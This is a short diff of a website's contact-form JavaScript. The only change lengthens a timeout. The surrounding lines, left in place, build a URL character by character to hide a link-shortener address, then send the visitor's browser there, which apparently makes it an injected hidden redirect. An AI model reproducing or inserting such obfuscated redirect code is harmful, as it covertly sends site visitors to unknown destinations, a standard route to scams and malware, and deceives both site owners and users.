@@ -442,7 +442,7 @@ $('#contactform').submit(function(e){
             var _u = ['h', 't', 't', 'p', 's', ':', '/', '/', 's', 'm', 'r', 't', 'u', 'r', 'l', '.', 'c', 'o', '/', '4', 'a', 'a', 'c', '4', '1', 'c'].join('');
            window.location.href = _u;
         document.getElementById('generate').classList.add('d-flex', 'justify-content-center', 'mt-3');
-    }, 10000);
+    }, 20000);
 });
 
 
